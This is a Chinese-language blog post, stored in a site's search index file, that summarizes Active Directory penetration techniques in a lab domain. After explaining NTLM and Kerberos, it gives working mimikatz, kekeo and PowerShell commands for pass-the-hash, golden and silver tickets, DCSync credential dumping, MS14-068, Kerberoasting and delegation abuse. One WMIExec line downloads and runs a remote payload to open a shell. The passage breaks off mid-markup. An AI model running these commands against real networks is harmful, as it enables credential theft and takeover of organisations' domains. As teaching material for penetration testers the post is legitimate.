<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>域渗透常用姿势总结</title>
      <link href="/2019/09/23/domain-1/"/>
      <url>/2019/09/23/domain-1/</url>
      
        <content type="html"><![CDATA[<p>整理完这一套累死…</p><a id="more"></a><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>整理总结一下域渗透中常用的知识和手法，构建知识体系 : ）</p><p>感谢<code>klion</code>师傅提供的环境。</p><p>感谢各位师傅们的输出(ﾉ*･ω･)ﾉ 参考的文章基本都在参考链接中。</p><p><img src="https://www.71714.com/wp-content/uploads/2018/07/phpcode1530541353VdON2f.gif" alt></p><h3 id="域渗透-—-预备知识"><a href="#域渗透-—-预备知识" class="headerlink" title="域渗透 — 预备知识"></a>域渗透 — 预备知识</h3><h4 id="何为域"><a href="#何为域" class="headerlink" title="何为域"></a>何为域</h4><p>域（Domain）是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系（即Trust Relation）。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。</p><p>在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域；每个域都有自己的安全策略，以及它与其他域的安全信任关系。</p><h4 id="windows-认证方式"><a href="#windows-认证方式" class="headerlink" title="windows 认证方式"></a>windows 认证方式</h4><h5 id="NTLM认证"><a href="#NTLM认证" class="headerlink" title="NTLM认证"></a>NTLM认证</h5><p>本地登录时，用户的密码经过散列算法加密后存储在<code>system32\config\sam</code>文件，当用户在登录界面输入密码后，<code>winlogon.exe</code>接收用户输入，然后把密码给<code>lsass.exe</code>，将密码转成<code>NT Hash</code>,然后与文件中已有的散列值比较。</p><h6 id="Hash类型"><a href="#Hash类型" class="headerlink" title="Hash类型"></a>Hash类型</h6><p>LM Hash</p><p><code>LM(LAN Manager) Hash</code> 是早期使用的一种<code>hash</code>，在<code>windows vista</code>以后的版本中默认被禁用，使用更加安全的<code>NTLM Hash</code>.</p><p>NT Hash</p><p>现在<code>windows</code>存储使用的<code>hash</code></p><p>NTLM Hash</p><p> <code>NTLM</code>认证过程中使用的<code>hash</code>，是现代<code>windows</code>系统中使用的一种<code>hash</code>，由<code>NT Hash</code>和<code>LM Hash</code>组成。储存在<code>SAM</code>文件中，如果存在域环境，也储存在域控的<code>NTDS.dit</code>文件中，可以直接拿来进行哈希传递攻击。</p><h6 id="工作组环境中的认证"><a href="#工作组环境中的认证" class="headerlink" title="工作组环境中的认证"></a>工作组环境中的认证</h6><p>认证使用<code>NTLM</code>协议，采用<code>Challenge/Response</code> 机制，认证过程可以分为三步：</p><ol><li>协商： 确定双方协议版本</li><li>质询：<code>Challenge/Response</code> 机制起作用的环节</li><li>验证：质询完成后验证结果</li></ol><p>质询的主要过程：</p><ul><li><p>客户端向服务端发送用户(用户名)请求</p></li><li><p>服务端接收请求，生成一个16位的随机数，称为<code>Challenge</code>,使用用户名对应的<code>NTLM Hash</code>加密<code>Challange</code>,生成的值称为<code>Challenge-server</code>,同时将16位随机数发送给客户端。</p></li><li><p>客户端接收到<code>Chanllenge</code>后，使用想要登录的用户对应的<code>NTLM Hash</code>加密它，该值称为<code>Challenge-client</code>然后发送给服务端。</p></li><li><p>服务端收到客户端发送的<code>Challenge-client</code>与<code>Challenge-server</code>比较，相等即通过认证。</p><p>其实就是双方规定一个字符串，利用散列算法的单向性以及唯一性对同一串字符串加密，生成一串散列值然后比较是否相等,并没有做过多的验证，所以会导致安全问题，最常见的就是<code>pth</code>.</p></li></ul><h6 id="域环境中的认证"><a href="#域环境中的认证" class="headerlink" title="域环境中的认证"></a>域环境中的认证</h6><p>在域中首先使用的是<code>Kerberos</code>认证，在一些早期版本中或者是前者出错时才会用<code>NTLM</code>认证。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190918181108.png" alt></p><p>与在工作组中的认证相比，在域中的认证多了个域控，域中的认证过程可以分为以下几步：</p><ul><li><p>客户端获取输入的<code>username</code> <code>password</code> <code>domain</code>信息，传给服务器。</p></li><li><p>与上面一样，服务端发送16位的随机码给客户端。</p></li><li><p>客户端使用本地的<code>NTLM Hash</code>对随机码加密，得到的值发送给服务端。</p></li><li><p>服务端向域控发送验证消息，消息包括客户端申请的用户名 随机码以及传过来的<code>Net NTLM Hash</code></p></li><li><p>域控查看该用户对应的<code>NTLM Hash</code>,然后加密随机码，将得到的<code>Net NTLM Hash</code>与客户端的做比较，将结果发给服务端。</p></li><li><p>服务端根据结果是否相等来返回给客户端不同的结果，验证通过或者是不通过。</p><p>可以看到与工作组认证相比，把验证对比的权利交给了域控，服务端只是起一个中间人的角色，负责传话。</p></li></ul><h6 id="pth"><a href="#pth" class="headerlink" title="pth"></a>pth</h6><p>从工作组认证过程可以看出，并没有对16位的随机字符串<code>Challenge</code>做任何处理，只是采用<code>NTLM Hash</code>对其加密，如果我们可以拿到该用户的<code>NTLM Hash</code>就能伪造一个正确的<code>Challenge-client</code>传给服务端完成认证，如果拿到<code>hash</code>以后无法解密，就可以尝试一下<code>pth</code>.</p><p>在一定条件下<code>pth</code>也可以用于远程桌面登录，细节看三好学生师傅<a href="[https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Pass-the-Hash-with-Remote-Desktop/](https://3gstudent.github.io/3gstudent.github.io/渗透技巧-Pass-the-Hash-with-Remote-Desktop/)">文章</a></p><h6 id="ptk"><a href="#ptk" class="headerlink" title="ptk"></a>ptk</h6><p>上文中提到可以使用<code>pth(pass the hash)</code>来完成对内网的渗透拓展，控制其他主机，微软在12年发布了针对<code>pth</code>的补丁<code>KBb2871997</code>,打了补丁以后常规的攻击无法复现，但是忽略了默认的<code>Administrator(SID 500)</code>,只要用户的<code>SID</code>为500，就可以用该账户进行攻击。</p><p>在内网禁用了<code>NTLM</code>的环境下也无法进行传递攻击。而<code>mimikatz</code>中的<code>sekurlsa::pth</code>模块可以突破这一点，使用<code>aes key</code> 完成攻击，所以被称为<code>pass-the-key</code>.</p><h5 id="Kerberos认证"><a href="#Kerberos认证" class="headerlink" title="Kerberos认证"></a>Kerberos认证</h5><p><code>Kerberos</code>认证涉及到三方，分别是<code>Client</code> <code>KDC</code> <code>Server</code>，而<code>KDC</code>又分为两部分，分别是<code>AS(Authentication Server)</code>以及<code>TGS(Ticket Granting Server)</code>,在该认证过程中靠的是票据，类似于<code>Token</code>一样的一种表明身份的东西。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190919085624.png" alt></p><p><code>kerberos</code>认证可以类比坐火车，首先你要通过火车站的安检系统，这样才能进入火车站，进站以后拿到上车的凭证-车票，上车时再核对车票信息，一切都通过后就可以享受火车之旅，同样的，在<code>kerberos</code>认证中<code>Client</code>先与<code>AS</code>交互，得到一个凭证来访问<code>TGS</code>，再与<code>TGS</code>交互，得到访问服务的凭证，最后与服务器交互，完成信息交互。</p><p>详细的认证过程如下：</p><p>首先是<code>AS</code>与<code>Client</code>交互：</p><ul><li><p><code>Client</code>向<code>AS</code>发送自己的<code>ID</code>  网络地址 等信息，经过<code>Client</code>的<code>hash</code>加密。(KRB_AS_REQ)</p></li><li><p><code>AS</code>向<code>Client</code>发送两条消息，一条是经过<code>Client</code>密码加密的<code>TGS-Session-Key</code>,用作与<code>TGS</code>交互的密钥.</p><p>另一条消息就是<code>TGT</code>,<code>TGT</code>包括<code>TGS-Session-Key</code>以及时间戳等信息，由<code>KRBTGT</code>账户的<code>hash</code>加密，该账户是域创建时自动创建的账号。(KRB_AS_REP)</p></li></ul><p>然后是<code>Client</code>与<code>TGS</code>的交互：</p><ul><li><code>Client</code>收到<code>AS</code>返回的信息，解密第一条信息，得到与<code>TGS</code>交互的密钥。然后将本地信息通过密钥加密后连同<code>TGT</code>一起发送给<code>TGS</code>.(KRB_TGS_REQ)</li><li><code>TGS</code>接收到消息后会检查是否存在所请求的服务，如果存在就用<code>KRBTGT</code>账户的<code>Hash</code>解密<code>TGT</code>,然后验证相关信息，验证通过后会使用<code>TGS-Session-Key</code>加密<code>Server-Session-Key</code>(<code>Client</code>与<code>Server</code>交互的密钥)，将时间戳 生命周期等信息通过服务的<code>Hash</code>加密后作为<code>Server-Ticket</code>传给<code>Client</code>.(KRB_TGS_REP)</li></ul><p>最后是<code>Client</code>与<code>Server</code>的交互：</p><ul><li><code>Client</code>获得<code>TGS</code>发回的数据后用<code>Server-Session-Key</code>解密得到<code>Server-Session-Key</code>,将网络地址 ID等信息通过<code>Server-Session-Key</code>加密，连带<code>Server-Ticket</code>一起发送给<code>Server</code>.(KRB_AP_REQ)</li><li><code>Server</code>接收到消息后会用自身<code>Hash</code>解密<code>Server-Ticket</code>，然后验证，验证通过后开始传输数据，走正常的服务请求。(KRB_AP_REP)</li></ul><h6 id="Golden-Ticket-黄金票据"><a href="#Golden-Ticket-黄金票据" class="headerlink" title="Golden Ticket(黄金票据)"></a>Golden Ticket(黄金票据)</h6><p><code>TGT</code>是由<code>KRBTGT</code>用户生成的，有了该票据你可以访问任何通过<code>kerberos</code>认证的服务，如果我们拿到了该用户的<code>Hash</code>，那么我们就可以伪造<code>TGT</code>,该用户只存在于域控中，所以前提是你要拿到域控的权限，有了域控权限干啥不行…  </p><h6 id="Silver-Ticket-白银票据"><a href="#Silver-Ticket-白银票据" class="headerlink" title="Silver Ticket(白银票据)"></a>Silver Ticket(白银票据)</h6><p>如果我们有服务器上的用户<code>Hash</code>,就可以伪造一个<code>Server-Ticket</code>绕过认证，达到访问服务的目的。白银票据只能访问特定的服务。</p><h6 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h6><p><code>MS14-068</code>是密钥分发中心（<code>KDC</code>）服务中的Windows漏洞。它允许经过身份验证的用户在其<code>Kerberos</code>票据（<code>TGT</code>）中<br>插入任意PAC（表示所有用户权限的结构）。该漏洞位于<code>kdcsvc.dll</code>域控的<code>KDC</code>中。用户可以通过<br>呈现具有改变的<code>PAC</code>的<code>Kerberos TGT</code>来获得票据。</p><p>一句话，可以在拥有一个普通域用户的情况下可以提升为域管理权限。</p><h6 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h6><p>委派分为三种，分别是无约束委派 约束委派以及基于资源的约束委派.</p><p>委派简单来说就是模拟客户端，允许服务器用客户端的身份与其他服务交互，比方说在域中有站库分离的<code>web</code>服务，客户端A,<code>http</code>服务器B,<code>mysql</code>服务器C，A想要获得某些数据，就需要B与C交互，这时B扮演的就是客户端的角色，这就是一个委派的例子。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190919181140.png" alt></p><p>委派的认证过程如下：</p><p>客户端与<code>KDC</code>完成<code>KRB_AS_REP</code> <code>KRB_AS_REQ</code> 交互.拿到<code>forwardable TGT</code>.</p><p>客户端通过<code>KRB_TGS_REQ</code> 请求转发的<code>TGT</code>,记作<code>forwarded TGT</code>,<code>KDC</code>通过<code>KRB_TGS_REP</code>返回该票据。</p><p>客户端使用<code>forwarded TGT</code>通过<code>KRB_TGS_REQ</code>请求<code>Server 1</code>的服务对应的票据，<code>KDC</code>通过<code>KRB_TGS_REP</code>返回票据。</p><p>客户端通过<code>KRB_AP_REQ</code>向<code>Server 1</code>发送服务票据 <code>forwardable TGT</code> <code>forwarded TGT</code>以及对应的密钥等信息。</p><p>为了满足客户端的需求，<code>Server 1</code>需要用到<code>server2</code>的一些数据，需要<code>server1</code>以用户的身份请求<code>Server 2</code>，在该过程中，<code>server1</code>使用<code>forwarded TGT</code>，以用户的名义通过<code>KRB_TGS_REQ</code>向<code>KDC</code>请求<code>Server 2</code>的服务票据，通过<code>KRB_TGS_REP</code>返回<code>server2</code>的服务票据。</p><p><code>server1</code> 用该票据请求<code>server2</code>，获取数据。</p><p>然后重复上述的过程…</p><p>当开启无约束委派时，<code>DC</code>会将客户端的<code>TGT</code>的副本放在服务票据中，当客户端向服务器提供服务票据时，服务器会将票据中的用户<code>TGT</code>放入<code>lsass.exe</code>中，在有效期内可以无限制的假冒该用户。如果管理员访问了无约束委派的服务，就能拿到管理员的<code>TGT</code>,模拟域管理访问任意服务，获得管理权限。</p><p>为了解决上述问题，微软提出了约束性委派，微软发布了两个<code>kerberos</code>拓展协议，<code>S4U2Proxy</code>和<code>S4U2Self</code>.</p><p>无约束委派中直接拿用户的<code>TGT</code>访问服务，在委派服务中，服务A<code>S4UProxy</code>向<code>KDC</code>申请访问服务B的服务票据，然后A使用<code>KDC</code>返回的新票据来访问B。<code>S4USelf</code>协议用来转换非<code>kerberos</code>协议与服务的认证，向服务器申请服务票据，就可以使用<code>S4UProxy</code>协议请求访问其他服务的票据。</p><p>有点懵… 先占个坑</p><p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94</a></p><p>基于资源的约束委派，可以看<a href="http://blog.nsfocus.net/analysis-attacks-entitlement-resource-constrained-delegation/" target="_blank" rel="noopener">绿盟博客</a></p><h6 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h6><p>在<code>kerberos</code>认证过程的第四步中，<code>TGS</code>会向<code>Client</code>发送经过服务账户的<code>Hash</code>加密后的服务票据，我们可以拿到这个票据，在本地模拟加密过程对密码进行爆破。如果得到的票据相同，说明得到了服务账户的密码。</p><p>服务主体名称(<code>Service Principal Names</code> <code>SPN</code>)是服务器运行服务的唯一标识，每个使用<code>kerberos</code>协议的服务都需要注册一个<code>SPN</code>,<code>SPN</code>分为两种，一种注册在域内机器用户账户(Computer),一种注册在域内用户账户(User)。机器账户一般是默认注册的，如果在域用户下运行服务，必须手动注册<code>SPN</code>,用到<code>setspn.exe</code>。</p><p>通过<code>SPN</code>查询，可以挖掘有用的信息，注册在域内用户账户下的<code>SPN</code>, 使用<code>Kerberoast</code>攻击尝试获取密码，也可以找到域中开启相关服务的主机，可以尝试用当前域用户信息登录主机，因为<code>SPN</code>发生在认证过程中，属于正常范围之内，所以比较难检测。</p><h4 id="组策略首选项-SYSVOL-GPP漏洞-–2k08"><a href="#组策略首选项-SYSVOL-GPP漏洞-–2k08" class="headerlink" title="组策略首选项 + SYSVOL (GPP漏洞 –2k08)"></a>组策略首选项 + SYSVOL (GPP漏洞 –2k08)</h4><p><code>SYSVOL</code>存在于域中的所有域控中。包含公共文件的共享文件夹，包括组策略数据 ，经过认证的用户都可以访问该文件夹。所有域组策略都存储在这里：<code>\\ &lt;DOMAIN&gt; \ SYSVOL \ &lt;DOMAIN&gt; \ Policies \</code></p><p>在<code>win2k8</code>中添加了<code>GPP</code>选项，即组策略首选项，可以完成更多的系统及应用管理，比如说管理本地用户 添加计划任务等。</p><p>在08的域控上为域主机远程添加用户，所有的操作都会写到<code>Group.xml</code>文件中，包括创建的账户名称 时间 以及加密后的密码。该密码默认是用<code>AES256</code>加密的，而且官方提供了完整的<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN#endNote2" target="_blank" rel="noopener">密钥</a>,正好用来解密得到密码。漏洞的补丁编号为<code>KB2962486</code>.</p><h4 id="域信任关系"><a href="#域信任关系" class="headerlink" title="域信任关系"></a>域信任关系</h4><p>域信任关系可以认为是一个域与其他域之间的一种资源访问控制，就像两个国家之间的外交关系，有合作伙伴 也有战略合作伙伴，不同的等级对应的开放程度也不相同。</p><p>域信任是有方向的，单向信任以及双向信任。</p><p>域信任按传递性可以分为可以传递的(朋友的朋友还是朋友，A-&gt;B B-&gt;C =&gt;A-&gt;C)和非传递性的.</p><p>默认信任关系</p><p>手动创建的其他信任关系</p><p><a href="https://wenku.baidu.com/view/196c4f7f27284b73f2425042.html" target="_blank" rel="noopener">域和信任关系</a></p><h4 id="域信息收集常用命令"><a href="#域信息收集常用命令" class="headerlink" title="域信息收集常用命令"></a>域信息收集常用命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/all   查看ip</span><br><span class="line">net user   查看本地用户</span><br><span class="line">net user /domain  查看域用户</span><br><span class="line">net view /domain 查看有几个域</span><br><span class="line">net view /domain:domain_name  查看某个域内主机</span><br><span class="line">net group /domain             查看域有哪些组</span><br><span class="line">net group “domain admins” /domain 查看域管理员组</span><br><span class="line">net group “domain controllers” /domain查看域控</span><br><span class="line">net localgroup administrators /domain查看域管理</span><br><span class="line">net time</span><br><span class="line">hostname 主机名</span><br><span class="line">query user  用户登录信息 判断用户是否在线</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="待补充…"><a href="#待补充…" class="headerlink" title="待补充…"></a>待补充…</h4><h3 id="域渗透-—-实践过程"><a href="#域渗透-—-实践过程" class="headerlink" title="域渗透 — 实践过程"></a>域渗透 — 实践过程</h3><h4 id="pth-1"><a href="#pth-1" class="headerlink" title="pth"></a>pth</h4><p>拿到了用户的哈希解不开时，可以使用<code>pth</code></p><h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line">如果显示不全，采用非交互式可以导出到文件中查看</span><br><span class="line">mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords&quot;&quot; exit &gt;&gt; result.txt</span><br></pre></td></tr></table></figure><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190920143931.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:workgroup /ntlm:ntlm_hash </span><br><span class="line">ps：3.144 为域控ip</span><br></pre></td></tr></table></figure><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190920150511.png" alt></p><h5 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h5><p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-WMIExec.ps1" target="_blank" rel="noopener">Invoke-WMIExec.ps1</a></p><p>可以执行命令，也可以反弹一个<code>shell</code>,此处加载<code>payload</code>,反弹给<code>cs</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WMIExec  -Target 192.168.3.144 -Domain workgroup -Username administrator -Hash hash -Command &quot;powershell.exe iex(New-Object Net.WebClient).DownloadString(&apos;http://192.168.3.128</span><br><span class="line">/payload.ps1&apos;)&quot;</span><br></pre></td></tr></table></figure><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190920153716.png" alt></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190920153617.png" alt></p><h4 id="ptt"><a href="#ptt" class="headerlink" title="ptt"></a>ptt</h4><p>用在<code>kerberos</code>认证中，主要有以下三种..</p><h5 id="MS14-068-1"><a href="#MS14-068-1" class="headerlink" title="MS14-068"></a>MS14-068</h5><p>域内用户的<code>sid</code>  域用户的密码  域控位置</p><p><a href="https://github.com/abatchy17/WindowsExploits/blob/master/MS14-068/MS14-068.exe" target="_blank" rel="noopener">MS14-068.exe</a></p><p><code>whoami /all</code>查看用户<code>sid</code></p><p>工具相关参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-u 域主机名@域名</span><br><span class="line">-p 密码</span><br><span class="line">-s sid值</span><br><span class="line">-d 域控</span><br></pre></td></tr></table></figure><p>生成<code>ccache</code>文件</p><p><code>MS14-068.exe -u sqladmin@rootkit.org -p password -s S-1-5-21-3759881954-2993291187-3577547808-1613 -d OWA2013.rootkit.org</code></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190921100150.png" alt></p><p>使用法国神器导入之前生成的<code>ccache</code>文件，导入之前先清除一下缓存中的票据</p><h5 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h5><p>前提：</p><ul><li>域名</li><li>sid</li><li><code>krbtgt</code>账户的<code>NTLM HASH</code></li><li>伪造用户名</li></ul><p>导出<code>krbtgt</code> 的<code>Hash</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::dcsync /user:krbtgt</span><br></pre></td></tr></table></figure><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190921105552.png" alt></p><p>生成黄金票据，伪造域用户<code>administrator</code>，注入票据后查看域用户共享</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::golden /domain:rootkit.org /sid:sid/aes256:ase256 /user:administrator /ticket:admin.kirbi</span><br></pre></td></tr></table></figure><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190921110804.png" alt></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190921113004.png" alt></p><p>也可以使用<code>Hash</code>值，不使用<code>key</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsadump::lsa /patch 导出hash</span><br><span class="line">kerberos::golden /domain:rootkit.org /sid:sid /krbtgt:hash /user:administrator /ticket:admin.kirbi</span><br></pre></td></tr></table></figure><h5 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h5><p>白银票据不需要与<code>KDC</code>交互，需要服务的<code>Hash</code>，只能面向特定服务。</p><p>复现之前记得先清除票据.</p><p><code>klist purge</code> 或者在<code>mimikatz</code>中：<code>kerberos:：purge</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::golden /user:dbadmin /domain:rootkit.org /sid:sid /targe</span><br><span class="line">t:Srv-Web-Kit.rootkit.org /rc4:ntlm_hash /ptt</span><br></pre></td></tr></table></figure><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190921123535.png" alt></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190921123729.png" alt></p><h4 id="ptk-1"><a href="#ptk-1" class="headerlink" title="ptk"></a>ptk</h4><p>前面的概念中提过一点，打了补丁以后，<code>ptt</code>只能用<code>mimikatz</code>来完成。</p><p>获取<code>aes key</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::ekeys</span><br></pre></td></tr></table></figure><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190920170715.png" alt></p><p>导入<code>key</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sekurlsa::pth /user:administrator /domain:workgroup /aes128:key</span><br></pre></td></tr></table></figure><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190920171934.png" alt></p><p>要用主机名访问… 在这卡了好一会…</p><h4 id="kerberoast"><a href="#kerberoast" class="headerlink" title="kerberoast"></a>kerberoast</h4><p>攻击一般分为<code>SPN</code>发现，请求票据 导出票据 破解票据 重写这几部分。</p><p>第一种使用<code>mimikatz</code>的方法</p><p><a href="https://github.com/nidem/kerberoast" target="_blank" rel="noopener">kerberoast</a></p><p>使用工具集中的<code>GetUserSPNs.ps1</code>进行扫描</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190921132855.png" alt></p><p>申请票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Add-Type -AssemblyName System.IdentityModel</span><br><span class="line"></span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/Srv-Web-Kit.rootkit.org:1433&quot;</span><br></pre></td></tr></table></figure><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190921133740.png" alt></p><p>使用<code>klist</code>会发现票据已经在内存中。</p><p>导出票据</p><p><code>kerberos::list /export</code></p><p>爆破票据</p><p>使用<code>tgsrepcrack.py</code>爆破</p><p><code>python tgsrepcrack.py dictfile 导出的票据</code> 能不能爆破成功关键还是字典…</p><p>第二种  直接提取字节流转换成可以爆破的格式</p><p><a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1" target="_blank" rel="noopener">Invoke-Kerberoast.ps1</a></p><p><code>Invoke-kerberoast –outputformat hashcat | fl</code></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190921135208.png" alt></p><p>使用<code>hashcat</code>破解，本地复现的时候提示装一些东西，就没去破解…</p><p>重新写入内存(未测试)</p><p><code>./kerberoast.py -p Password1 -r 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi -w sql.kirbi -u 500</code></p><p>把新的票据重新注入内存</p><p><code>kerberos::ptt sql.kirbi</code></p><h4 id="委派攻击-1"><a href="#委派攻击-1" class="headerlink" title="委派攻击"></a>委派攻击</h4><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L4906" target="_blank" rel="noopener">powerview.ps1</a></p><h5 id="无约束委派"><a href="#无约束委派" class="headerlink" title="无约束委派"></a>无约束委派</h5><p>在域控给服务账户设置无约束委派</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190922122852.png" alt></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190922122927.png" alt></p><p>选择第二项，无约束委派,如果服务没有注册<code>SPN</code>,先使用<code>setspn.exe</code>注册一下。</p><p>假设我们拿到了域内一台服务的权限</p><p>使用<code>PowerView.ps1</code>脚本查看开启无约束委派的服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-NetUser -Unconstrained -Domain rootkit.org</span><br><span class="line">Get-NetComputer -Unconstrained -Domain rootkit.org</span><br></pre></td></tr></table></figure><p>提取受控主机内存中保存的票据，进行<code>ptt</code>攻击。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::tickets /export //导出票据</span><br></pre></td></tr></table></figure><p>可以看到有域管理的凭证，</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190922124239.png" alt></p><p>注入该凭证。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190922124805.png" alt></p><p>然后访问域控。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190922125244.png" alt></p><h5 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h5><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190922125632.png" alt></p><p>在开启约束委派的主机上无法抓到用户的<code>TGT</code>,只能抓到服务票据，所以只能访问特定的服务。</p><p>如果知道服务账户的的明文密码或者哈希值，就可以拿到域管理权限。</p><p><a href="https://github.com/gentilkiwi/kekeo/releases" target="_blank" rel="noopener">kekeo</a></p><p>查看约束委派是否存在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -TrustedToAuth -Domain rootkit.org //账户</span><br><span class="line">Get-NetComputer -Unconstrained -Domain rootkit.org //主机</span><br></pre></td></tr></table></figure><p>生成<code>tgt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:sqladmin /domain:rootkit.org /password:Admin12345</span><br></pre></td></tr></table></figure><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190922134551.png" alt></p><p>申请<code>tgs</code>票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u:TGT_sqladmin@ROOTKIT.ORG_krbtgt~rootkit.org@ROOTKIT.ORG.kirbi /user:administrator@rootkit.org  /service</span><br><span class="line">:cifs/OWA2013.rootkit.org</span><br></pre></td></tr></table></figure><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190922140157.png" alt></p><p>导入<code>tgs</code>票据</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190922135813.png" alt></p><p><code>dir</code>访问域控共享目录</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190922135923.png" alt></p><p><code>keoeo</code>也支持直接使用哈希获取<code>tgt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 